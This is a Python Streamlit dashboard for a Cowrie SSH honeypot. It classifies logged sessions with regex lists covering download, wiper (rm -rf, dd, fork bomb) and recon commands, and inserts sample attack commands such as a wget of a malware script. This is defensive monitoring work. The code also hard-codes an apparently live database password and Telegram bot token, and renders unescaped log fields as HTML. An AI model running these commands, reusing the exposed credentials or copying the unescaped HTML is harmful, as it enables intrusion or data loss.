import streamlit as st
import pandas as pd
import psycopg2
from psycopg2.extras import RealDictCursor
import json
import requests
from streamlit_autorefresh import st_autorefresh
from pyvis.network import Network
import streamlit.components.v1 as components
import networkx as nx
import tempfile
import os
import re
import random
from datetime import datetime
import socket
import time

# --- Configuration ---
DB_HOST = "aws-0-ap-southeast-1.pooler.supabase.com"
DB_NAME = "postgres"
DB_USER = "postgres.ypsdflhceqxrjwyxvclr"
DB_PASS = "Serigala76!"  # Verify this is correct in Supabase dashboard
DB_PORT = 5432

TELEGRAM_TOKEN = "8083560973:AAGoQstYrKVGVSIincqQ3r_MyGvurDVtNMo"
TELEGRAM_CHAT_ID = "623056896"

# --- Detection Patterns ---
MALWARE_PATTERNS = [
    r"wget\s+(https?|ftp)://",
    r"curl\s+(https?|ftp)://",
    r"\.(sh|bin|exe|py|js)\s*$"
]

WIPER_PATTERNS = [
    r"rm\s+-rf",
    r"dd\s+if=/dev/",
    r":\(\)\{:\|:\&\};:",
    r"mv\s+/dev/null",
    r">\s+/dev/sd[a-z]"
]

RECON_PATTERNS = [
    r"cat\s+/etc/passwd",
    r"uname\s+-a",
    r"whoami",
    r"busybox",
    r"nmap",
    r"ping\s+-t",
    r"ss\s+-tuln"
]

BRUTE_FORCE_THRESHOLD = 5

# --- Attack Color Mapping ---
ATTACK_COLORS = {
    "Brute Force Attack": "#D1ECF1",
    "Destructive Attack (Wiper)": "#FFB6B6",
    "Malware Download Attempt": "#FFF3CD",
    "Reconnaissance / Enumeration": "#E2E3E5",
    "Port Scanning / Connection Attempt": "#D4EDDA",
    "Command Injection Attempt": "#F8D7DA",
    "Successful Login": "#D1E7DD",
    "Failed Login": "#F8F9FA",
    "Unknown Activity": "#F0F0F0"
}

# --- Database Functions ---
def verify_supabase_connection():
    """Test all aspects of Supabase connection"""
    results = {
        'network': False,
        'auth': False,
        'table': False
    }
    
    # Test network connectivity
    try:
        with socket.create_connection((DB_HOST, DB_PORT), timeout=10) as sock:
            results['network'] = True
    except Exception as e:
        st.error(f"Network test failed: {str(e)}")
        return results
    
    # Test database authentication
    try:
        conn = psycopg2.connect(
            host=DB_HOST,
            dbname=DB_NAME,
            user=DB_USER,
            password=DB_PASS,
            port=DB_PORT,
            sslmode="require",
            connect_timeout=10
        )
        conn.close()
        results['auth'] = True
    except psycopg2.OperationalError as e:
        st.error(f"Connection failed: {str(e)}")
        return results
    except psycopg2.ProgrammingError as e:
        st.error(f"Authentication failed: {str(e)}")
        return results
    
    # Test table access
    try:
        conn = psycopg2.connect(
            host=DB_HOST,
            dbname=DB_NAME,
            user=DB_USER,
            password=DB_PASS,
            port=DB_PORT,
            sslmode="require"
        )
        with conn.cursor() as cur:
            cur.execute("SELECT EXISTS (SELECT FROM information_schema.tables WHERE table_name = 'hornet7_data')")
            results['table'] = cur.fetchone()[0]
        conn.close()
    except Exception as e:
        st.error(f"Table access test failed: {str(e)}")
    
    return results

@st.cache_resource(ttl=3600)
def get_connection():
    """Create and cache database connection with comprehensive error handling"""
    connection_params = {
        "host": DB_HOST,
        "dbname": DB_NAME,
        "user": DB_USER,
        "password": DB_PASS,
        "port": DB_PORT,
        "cursor_factory": RealDictCursor,
        "sslmode": "require",
        "connect_timeout": 10,
        "keepalives": 1,
        "keepalives_idle": 30,
        "keepalives_interval": 10,
        "keepalives_count": 5
    }
    
    try:
        # Attempt connection
        conn = psycopg2.connect(**connection_params)
        
        # Verify connection works
        with conn.cursor() as cur:
            cur.execute("SELECT 1")
            result = cur.fetchone()
            if not result or result[0] != 1:
                raise ValueError("Connection test failed")
        
        # Set connection to auto-reconnect
        conn.autocommit = False
        return conn
        
    except psycopg2.OperationalError as e:
        st.error(f"""
        ❌ Connection failed (OperationalError):
        - Check network connectivity to {DB_HOST}:{DB_PORT}
        - Verify database is running
        - Error: {str(e)}
        """)
    except psycopg2.ProgrammingError as e:
        st.error(f"""
        ❌ Authentication failed (ProgrammingError):
        - Verify username/password are correct
        - Check user permissions
        - Error: {str(e)}
        """)
    except Exception as e:
        st.error(f"""
        ❌ Unexpected connection error:
        - Error: {str(e)}
        """)
    
    return None

def execute_query(query, params=None):
    """Execute SQL query with robust connection handling"""
    conn = None
    max_retries = 2
    retry_delay = 2  # seconds
    
    for attempt in range(max_retries + 1):
        try:
            conn = get_connection()
            if conn is None:
                st.error("Failed to get database connection after retries.")
                return None
            
            with conn.cursor() as cur:
                st.info(f"Executing query (attempt {attempt + 1}/{max_retries + 1}): `{query.strip().splitlines()[0]}...`")
                cur.execute(query, params or ())
                
                if cur.description:  # If query returns results
                    results = cur.fetchall()
                    st.info(f"Query returned {len(results)} rows.")
                    return results
                else: 
                    conn.commit()
                    st.success("Query executed successfully (no results expected).")
                    return True
                
        except (psycopg2.InterfaceError, psycopg2.OperationalError) as e:
            if attempt < max_retries:
                st.warning(f"⚠️ Connection issue detected, retrying... (attempt {attempt + 1}/{max_retries + 1}) Error: `{str(e)}`")
                st.cache_resource.clear() 
                time.sleep(retry_delay)
                continue
            st.error(f"❌ Query failed after retries (Interface/Operational Error): `{str(e)}`")
            return None
        except psycopg2.Error as e:
            st.error(f"❌ PostgreSQL error during query execution: `{str(e)}`")
            return None
        except Exception as e:
            st.error(f"❌ Unexpected error during query execution: `{str(e)}`")
            return None
        finally:
            if conn:
                conn.close()

@st.cache_data(ttl=60)
def load_data():
    """Load and process data from database"""
    st.info("Attempting to load data from 'hornet7_data' table...")
    
    query = """
        SELECT
            id,
            created_at,
            eventid,
            timestamp,
            username,
            password,
            src_ip,
            src_port,
            dst_ip,
            dst_port,
            session,
            protocol,
            duration,
            message,
            sensor,
            version,
            hassh,
            hasshalgorithms,
            kexalgs,
            enccs,
            maccs,
            compcs,
            langcs,
            width,
            height,
            arch,
            input,
            ttylog,
            size,
            shasum,
            duplicate,
            keyalgs,
            COUNT(*) OVER (PARTITION BY src_ip, eventid) as calculated_attempt_count
        FROM hornet7_data
        ORDER BY timestamp DESC
        LIMIT 500
    """
    
    rows = execute_query(query)
    
    if rows is None:
        st.warning("⚠️ No data retrieved from the database. This could mean the table is empty, or there was a query/connection issue.")
        return pd.DataFrame()
    if not rows: 
        st.warning("⚠️ Query executed, but no rows were returned. The 'hornet7_data' table might be empty.")
        return pd.DataFrame()
        
    df = pd.DataFrame(rows)
    st.info(f"Successfully loaded {len(df)} rows from the database.")
    
    # Rename the calculated column to match what detect_attack_type expects
    df.rename(columns={'calculated_attempt_count': 'attempt_count'}, inplace=True)

    # Apply attack detection
    attack_info = []
    for _, row in df.iterrows():
        # Ensure that 'input' and 'message' are treated as strings before passing to regex
        row['input'] = str(row.get('input', ''))
        row['message'] = str(row.get('message', ''))
        attack_info.append(detect_attack_type(row))
        
    df['attack_type'] = [x[0] for x in attack_info]
    df['attack_details'] = [x[1] for x in attack_info]
    
    return df

def detect_attack_type(row):
    """Classify attack type based on log entry"""
    eventid = str(row.get('eventid', '')).lower() 
    input_cmd = str(row.get('input', '')).lower() 
    message = str(row.get('message', '')).lower() 
    
    if eventid == 'cowrie.login.failed':
        try:
            attempt_count = int(row.get('attempt_count', 0)) 
        except (ValueError, TypeError):
            attempt_count = 0 
            
        if attempt_count >= BRUTE_FORCE_THRESHOLD:
            return "Brute Force Attack", f"Multiple failed logins ({attempt_count} attempts) for user '{row.get('username', 'N/A')}'"
        return "Failed Login", f"Single failed login attempt for user '{row.get('username', 'N/A')}'"
    
    elif eventid == 'cowrie.login.success':
        return "Successful Login", f"Login successful for user '{row.get('username', 'N/A')}'"
    
    elif eventid == 'cowrie.command.input':
        for pattern in WIPER_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Destructive Attack (Wiper)", f"Wiper command: {input_cmd[:50]}..."
        
        for pattern in MALWARE_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Malware Download Attempt", f"Download attempt: {input_cmd[:50]}..."
        
        for pattern in RECON_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Reconnaissance / Enumeration", f"Recon command: {input_cmd[:50]}..."
        
        return "Command Injection Attempt", input_cmd[:100]
    
    elif eventid == 'cowrie.session.connect':
        return "Port Scanning / Connection Attempt", f"Connection to port {row.get('dst_port', 'N/A')}"
    
    return "Unknown Activity", message[:100]

def build_session_graph(row):
    """Create network graph for a session"""
    G = nx.DiGraph()
    src_ip = row.get('src_ip')
    eventid = row.get('eventid')
    dst_port = row.get('dst_port')
    attack_type = row.get('attack_type')
    
    color_map = {
        "Brute Force Attack": "#FF6B6B",
        "Destructive Attack (Wiper)": "#FF0000",
        "Malware Download Attempt": "#FFA500",
        "Reconnaissance / Enumeration": "#ADD8E6",
        "Port Scanning / Connection Attempt": "#90EE90",
        "Command Injection Attempt": "#FFD700", 
        "Successful Login": "#32CD32", 
        "Failed Login": "#FFC0CB", 
        "Unknown Activity": "#808080" 
    }
    
    if src_ip:
        G.add_node(f"src_ip_{src_ip}", 
                  label=f"Source: {src_ip}",
                  color=color_map.get(attack_type, "lightblue"),
                  shape="box")
    
    if eventid:
        G.add_node(f"event_{eventid}", 
                  label=f"Event: {eventid}",
                  color="#F0F0F0", 
                  shape="ellipse")
    
    if dst_port:
        port_node = f"Port {dst_port}"
        G.add_node(f"port_{dst_port}", 
                  label=port_node,
                  color="#D8BFD8", 
                  shape="diamond")
    
    # Add edges
    if src_ip and eventid:
        G.add_edge(f"src_ip_{src_ip}", f"event_{eventid}", 
                  title=f"Attack: {attack_type}",
                  color=color_map.get(attack_type, "grey"))
    
    if eventid and dst_port:
        G.add_edge(f"event_{eventid}", f"port_{dst_port}", 
                  title=f"Target port: {dst_port}",
                  color="#888888")
    
    return G

def main():
    st.set_page_config(
        page_title="GraphPot - Network Session Analysis", 
        layout="wide",
        initial_sidebar_state="expanded"
    )
    
    st.title("🛡️ GraphPot - Network Session Analysis")
    
    # Connection verification
    with st.expander("🔍 Connection Verification", expanded=True):
        if st.button("Run Connection Tests"):
            test_results = verify_supabase_connection()
            
            if test_results['network']:
                st.success("✅ Network connectivity test passed")
            else:
                st.error("❌ Network test failed - check host/port")
                
            if test_results['auth']:
                st.success("✅ Database authentication test passed")
            else:
                st.error("❌ Authentication failed - check username/password")
                
            if test_results['table']:
                st.success("✅ Table access test passed")
            else:
                st.error("❌ Table 'hornet7_data' not found or inaccessible")
            
            if all(test_results.values()):
                st.success("✅ All connection tests passed!")
            else:
                st.error("❌ Connection issues detected - fix before proceeding")
                return
    
    if st.button("🔄 Refresh Data"):
        st.cache_data.clear() 
        st.rerun()

    st.markdown("---")

    # --- Auto Test Data Generator ---
    st.sidebar.header("🧪 Test Data Generator")
    attack_type_gen = st.sidebar.selectbox(
        "Select attack type to generate:",
        ["Brute Force", "Malware Download", "Wiper Attack", "Reconnaissance", "Port Scan"]
    )
    
    if st.sidebar.button("🚀 Auto Insert Test Data"):
        current_time = datetime.now().isoformat()
        test_data = {
            "timestamp": current_time,
            "created_at": current_time,
            "src_ip": f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
            "src_port": random.randint(1024, 65535),
            "dst_ip": "172.16.0.1",
            "dst_port": random.choice([22, 80, 443, 8080]),
            "session": f"TEST-{random.randint(1000,9999)}",
            "protocol": "ssh",
            "duration": random.uniform(0.5, 30.0),
            "message": "Generated test log entry",
            "sensor": "honeypot-test",
            "version": "Cowrie-1.0",
            "username": "testuser",
            "password": "testpassword",
            "hassh": "hassh_test_value",
            "hasshalgorithms": "sha256",
            "kexalgs": "diffie-hellman-group14-sha256",
            "enccs": "aes128-ctr",
            "maccs": "hmac-sha2-256",
            "compcs": "none",
            "langcs": "en-US",
            "width": 80,
            "height": 24,
            "arch": "x86_64",
            "input": "",
            "ttylog": None,
            "size": 0,
            "shasum": "",
            "duplicate": False,
            "keyalgs": "ssh-rsa",
            "attack_type": "Unknown Activity"
        }
        
        if attack_type_gen == "Brute Force":
            test_data.update({
                "eventid": "cowrie.login.failed",
                "message": "Failed login attempt",
                "username": f"user{random.randint(1,10)}",
                "password": f"pass{random.randint(1,10)}",
                "attack_type": "Brute Force Attack"
            })
        elif attack_type_gen == "Malware Download":
            test_data.update({
                "eventid": "cowrie.command.input",
                "input": "wget http://test.com/malware.sh",
                "message": "Command executed: wget http://test.com/malware.sh",
                "shasum": "abcdef1234567890",
                "size": 1024,
                "attack_type": "Malware Download Attempt"
            })
        elif attack_type_gen == "Wiper Attack":
            test_data.update({
                "eventid": "cowrie.command.input",
                "input": "rm -rf /important/files",
                "message": "Command executed: rm -rf /important/files",
                "attack_type": "Destructive Attack (Wiper)"
            })
        elif attack_type_gen == "Reconnaissance":
            test_data.update({
                "eventid": "cowrie.command.input",
                "input": "cat /etc/passwd",
                "message": "Command executed: cat /etc/passwd",
                "attack_type": "Reconnaissance / Enumeration"
            })
        elif attack_type_gen == "Port Scan":
            test_data.update({
                "eventid": "cowrie.session.connect",
                "message": f"Port scan detected on {test_data['dst_port']}",
                "attack_type": "Port Scanning / Connection Attempt"
            })
        
        insert_query = """
            INSERT INTO hornet7_data 
            (created_at, eventid, timestamp, username, password, src_ip, src_port, dst_ip, dst_port, session, protocol, duration, message, sensor, version, hassh, hasshalgorithms, kexalgs, enccs, maccs, compcs, langcs, width, height, arch, input, ttylog, size, shasum, duplicate, keyalgs, attack_type)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        """
        
        insert_params = (
            test_data.get('created_at'),
            test_data.get('eventid'),
            test_data.get('timestamp'),
            test_data.get('username'),
            test_data.get('password'),
            test_data.get('src_ip'),
            test_data.get('src_port'),
            test_data.get('dst_ip'),
            test_data.get('dst_port'),
            test_data.get('session'),
            test_data.get('protocol'),
            test_data.get('duration'),
            test_data.get('message'),
            test_data.get('sensor'),
            test_data.get('version'),
            test_data.get('hassh'),
            test_data.get('hasshalgorithms'),
            test_data.get('kexalgs'),
            test_data.get('enccs'),
            test_data.get('maccs'),
            test_data.get('compcs'),
            test_data.get('langcs'),
            test_data.get('width'),
            test_data.get('height'),
            test_data.get('arch'),
            test_data.get('input'),
            test_data.get('ttylog'),
            test_data.get('size'),
            test_data.get('shasum'),
            test_data.get('duplicate'),
            test_data.get('keyalgs'),
            test_data.get('attack_type')
        )
        
        if execute_query(insert_query, insert_params):
            st.sidebar.success(f"Inserted {attack_type_gen} test data!")
            st.cache_data.clear() 
            st.rerun()
        else:
            st.sidebar.error("Failed to insert test data. Check error messages above.")

    # Load data with progress indicator
    with st.spinner('Loading threat data...'):
        df = load_data()

    if not df.empty:
        # --- Summary Metrics ---
        st.subheader("📊 Attack Summary")
        cols = st.columns(4)
        metrics = [
            ("🔒 Brute Force", "Brute Force Attack"),
            ("🐍 Malware Download", "Malware Download Attempt"),
            ("🔥 Wiper Attack", "Destructive Attack (Wiper)"),
            ("🕵️ Reconnaissance", "Reconnaissance / Enumeration")
        ]
        
        for (icon, metric), col in zip(metrics, cols):
            col.metric(icon, (df['attack_type'] == metric).sum())

        st.markdown("---")

        # --- Moving Marquee ---
        top_ips = df['src_ip'].value_counts().head(3).index.tolist() if 'src_ip' in df.columns else []
        top_sessions = df['session'].value_counts().head(3).index.tolist() if 'session' in df.columns else []
        top_events = df['eventid'].value_counts().head(3).index.tolist() if 'eventid' in df.columns else []

        moving_text = f"Top IPs: {', '.join(top_ips)} | Top Sessions: {', '.join(top_sessions)} | Top Events: {', '.join(top_events)}"
        st.markdown(
            f'<marquee style="font-size: 18px; color: black; background-color: white; padding: 10px;">{moving_text}</marquee>',
            unsafe_allow_html=True
        )

        st.markdown("---")

        # --- Data Management Section ---
        with st.expander("🛠️ Data Management Controls", expanded=False):
            col1, col2 = st.columns(2)
            
            with col1:
                st.subheader("➕ Insert New Entry")
                with st.form("insert_form"):
                    manual_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    new_data = {
                        "timestamp": st.text_input("Timestamp (YYYY-MM-DD HH:MM:SS)", manual_time),
                        "created_at": st.text_input("Created At (YYYY-MM-DD HH:MM:SS)", manual_time),
                        "src_ip": st.text_input("Source IP", "192.168.1.1"),
                        "src_port": st.number_input("Source Port", value=random.randint(1024, 65535), min_value=1, max_value=65535, step=1),
                        "dst_ip": st.text_input("Destination IP", "172.16.0.1"),
                        "dst_port": st.number_input("Destination Port", value=22, min_value=1, max_value=65535, step=1),
                        "eventid": st.selectbox("Event Type", [
                            "cowrie.login.failed", 
                            "cowrie.login.success",
                            "cowrie.command.input",
                            "cowrie.session.connect",
                            "Unknown Activity" 
                        ]),
                        "input": st.text_input("Command Input (if applicable)"),
                        "message": st.text_area("Log Message"),
                        "session": st.text_input("Session ID (e.g., MANUAL-1234)", f"MANUAL-{random.randint(1000,9999)}"),
                        "protocol": st.text_input("Protocol", "ssh"),
                        "duration": st.number_input("Duration (seconds)", value=random.uniform(1.0, 60.0), step=0.1),
                        "sensor": st.text_input("Sensor ID", "manual-entry"),
                        "version": st.text_input("Version", "Honeypot-Manual"),
                        "username": st.text_input("Username (if login event)", "guest"),
                        "password": st.text_input("Password (if login event)", ""),
                        "hassh": st.text_input("HASSH", "manual_hassh"),
                        "hasshalgorithms": st.text_input("HASSH Algorithms", "sha256_alg"),
                        "kexalgs": st.text_input("KEX Algs", "kex_alg"),
                        "enccs": st.text_input("ENCCS", "enc_alg"),
                        "maccs": st.text_input("MACCS", "mac_alg"),
                        "compcs": st.text_input("COMPCS", "comp_alg"),
                        "langcs": st.text_input("LANGCS", "en-US"),
                        "width": st.number_input("Width", value=80, min_value=1),
                        "height": st.number_input("Height", value=24, min_value=1),
                        "arch": st.text_input("Arch", "x86_64"),
                        "ttylog": None,
                        "size": st.number_input("Size", value=0, min_value=0),
                        "shasum": st.text_input("SHASUM", ""),
                        "duplicate": st.checkbox("Duplicate", value=False),
                        "keyalgs": st.text_input("Key Algs", "ssh-rsa"),
                        "attack_type": st.text_input("Attack Type (optional)", "Unknown Activity")
                    }

                    if st.form_submit_button("Insert Entry"):
                        insert_query_manual = """
                            INSERT INTO hornet7_data 
                            (created_at, eventid, timestamp, username, password, src_ip, src_port, dst_ip, dst_port, session, protocol, duration, message, sensor, version, hassh, hasshalgorithms, kexalgs, enccs, maccs, compcs, langcs, width, height, arch, input, ttylog, size, shasum, duplicate, keyalgs, attack_type)
                            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                        """ 
                        insert_params_manual = (
                            new_data.get('created_at'),
                            new_data.get('eventid'),
                            new_data.get('timestamp'),
                            new_data.get('username'),
                            new_data.get('password'),
                            new_data.get('src_ip'),
                            new_data.get('src_port'),
                            new_data.get('dst_ip'),
                            new_data.get('dst_port'),
                            new_data.get('session'),
                            new_data.get('protocol'),
                            new_data.get('duration'),
                            new_data.get('message'),
                            new_data.get('sensor'),
                            new_data.get('version'),
                            new_data.get('hassh'),
                            new_data.get('hasshalgorithms'),
                            new_data.get('kexalgs'),
                            new_data.get('enccs'),
                            new_data.get('maccs'),
                            new_data.get('compcs'),
                            new_data.get('langcs'),
                            new_data.get('width'),
                            new_data.get('height'),
                            new_data.get('arch'),
                            new_data.get('input'),
                            new_data.get('ttylog'),
                            new_data.get('size'),
                            new_data.get('shasum'),
                            new_data.get('duplicate'),
                            new_data.get('keyalgs'),
                            new_data.get('attack_type')
                        )
                        if execute_query(insert_query_manual, insert_params_manual):
                            st.success("Entry inserted successfully!")
                            st.cache_data.clear()
                            st.rerun()
                        else:
                            st.error("Failed to insert entry. Check error messages above.")
            
            with col2:
                st.subheader("✏️ Update Entry Status")
                with st.form("update_form"):
                    session_ids_for_update = [""] + sorted(df['session'].unique().tolist()) if 'session' in df.columns else [""]
                    session_id_to_update = st.selectbox("Select Session ID to update", session_ids_for_update, key="update_session_select")
                    new_status = st.selectbox("Update Status", [
                        "investigating", 
                        "resolved", 
                        "false_positive",
                        "new" 
                    ])
                    if st.form_submit_button("Update Status"):
                        if session_id_to_update:
                            if execute_query("""
                                UPDATE hornet7_data 
                                SET attack_type = %s
                                WHERE session = %s
                                """, 
                                (new_status, session_id_to_update)
                            ):
                                st.success(f"Entry with Session ID '{session_id_to_update}' updated to '{new_status}' successfully!")
                                st.cache_data.clear()
                                st.rerun()
                            else:
                                st.error("Failed to update entry. Check error messages above.")
                        else:
                            st.warning("Please select a Session ID to update.")
                        
                st.subheader("❌ Delete Entry")
                with st.form("delete_form"):
                    session_ids_for_delete = [""] + sorted(df['session'].unique().tolist()) if 'session' in df.columns else [""]
                    del_id = st.selectbox("Select Session ID to delete", session_ids_for_delete, key="delete_session_select")
                    if st.form_submit_button("Delete Entry"):
                        if del_id:
                            if execute_query("""
                                DELETE FROM hornet7_data 
                                WHERE session = %s
                                """, 
                                (del_id,)
                            ):
                                st.success(f"Entry with Session ID '{del_id}' deleted successfully!")
                                st.cache_data.clear()
                                st.rerun()
                            else:
                                st.error("Failed to delete entry. Check error messages above.")
                        else:
                            st.warning("Please select a Session ID to delete.")

        st.markdown("---")

        # --- Highlight Table ---
        st.subheader("📋 Latest Captured Sessions")
        
        def highlight_rows(row):
            return ['background-color: ' + ATTACK_COLORS.get(row['attack_type'], '#FFFFFF')] * len(row)
        
        attack_filter = st.selectbox("🔍 Filter by Attack Type:", ["All"] + sorted(df['attack_type'].unique().tolist()))
        filtered_df = df if attack_filter == "All" else df[df['attack_type'] == attack_filter]
        
        st.dataframe(
            filtered_df[['timestamp', 'src_ip', 'eventid', 'attack_type', 'dst_port', 'session', 'username', 'protocol', 'message']] 
            .style.apply(highlight_rows, axis=1),
            use_container_width=True,
            height=400
        )

        st.markdown("---")

        # --- Network Session Mapping ---
        st.subheader("🧠 Network Session Mapping")
        
        session_options = df['session'].unique().tolist() if 'session' in df.columns else []
        if session_options:
            selected_session = st.selectbox(
                "Select a Session ID to visualize:",
                options=session_options
            )
        else:
            selected_session = None
            st.info("No sessions available to visualize in the graph.")

        if selected_session:
            selected_rows = df[df['session'] == selected_session]
            if not selected_rows.empty:
                selected_row = selected_rows.iloc[0] 
                attack_type_display = selected_row.get('attack_type', 'Unknown Activity') 
                bg_color = ATTACK_COLORS.get(attack_type_display, "#FFFFFF")
                
                with st.spinner('Generating attack graph...'):
                    G = nx.DiGraph()
                    
                    session_events = {} 
                    for _, row in selected_rows.iterrows():
                        current_src_ip = row.get('src_ip')
                        current_eventid = row.get('eventid')
                        current_dst_port = row.get('dst_port')
                        current_attack_type = row.get('attack_type', 'Unknown Activity')

                        if current_src_ip:
                            G.add_node(f"src_ip_{current_src_ip}", label=f"Source: {current_src_ip}",
                                       color=ATTACK_COLORS.get(current_attack_type, "lightblue"), shape="box")
                        
                        if current_eventid:
                            event_node_id = f"event_{current_eventid}"
                            if event_node_id not in session_events:
                                G.add_node(event_node_id, label=f"Event: {current_eventid}",
                                           color="#F0F0F0", shape="ellipse")
                                session_events[event_node_id] = True 

                        if current_dst_port:
                            port_node_id = f"port_{current_dst_port}"
                            G.add_node(port_node_id, label=f"Port {current_dst_port}",
                                       color="#D8BFD8", shape="diamond")

                        if current_src_ip and current_eventid:
                            G.add_edge(f"src_ip_{current_src_ip}", f"event_{current_eventid}",
                                       title=f"Attack: {current_attack_type}",
                                       color=ATTACK_COLORS.get(current_attack_type, "grey"))
                        
                        if current_eventid and current_dst_port:
                            G.add_edge(f"event_{current_eventid}", f"port_{current_dst_port}",
                                       title=f"Target port: {current_dst_port}",
                                       color="#888888")

                    net = Network(
                        height="700px", 
                        width="100%", 
                        directed=True, 
                        notebook=False,
                        cdn_resources="remote"
                    )
                    
                    net.force_atlas_2based(
                        gravity=-50,
                        central_gravity=0.01,
                        spring_length=100,
                        spring_strength=0.08,
                        damping=0.4,
                        overlap=0.1
                    )
                    
                    net.from_nx(G)
                    
                    try:
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
                            net.save_graph(tmp_file.name)
                            components.html(
                                open(tmp_file.name, 'r', encoding='utf-8').read(), 
                                height=700,
                                width=None
                            )
                        os.unlink(tmp_file.name) 
                    except Exception as e:
                        st.error(f"Failed to render network graph: {e}")

                st.markdown(f"""
                <div style="background-color:{bg_color}; padding:15px; border-radius:10px">
                <h4>Session Details for Session ID: <code>{selected_session}</code></h4>
                <p><b>First Event Source IP:</b> <code>{selected_row.get('src_ip', 'N/A')}</code></p>
                <p><b>Detected Attack Type (First Event):</b> <code>{attack_type_display}</code></p>
                <p><b>First Event Target Port:</b> <code>{selected_row.get('dst_port', 'N/A')}</code></p>
                <p><b>First Event Timestamp:</b> <code>{selected_row.get('timestamp', 'N/A')}</code></p>
                <p><b>First Event Details:</b> <code>{selected_row.get('attack_details', 'N/A')}</code></p>
                </div>
                """, unsafe_allow_html=True)
            else:
                st.info(f"No details found for session ID: {selected_session}")
        else:
             st.info("Select a session ID from the dropdown to visualize its network activity.")

    else:
        st.warning("⚠️ No data found in the 'hornet7_data' table. Please use the 'Auto Insert Test Data' or 'Insert New Entry' functions, or ensure your database has data.")

    st_autorefresh(interval=120000, key="data_refresh_main")

if __name__ == "__main__":
    main()
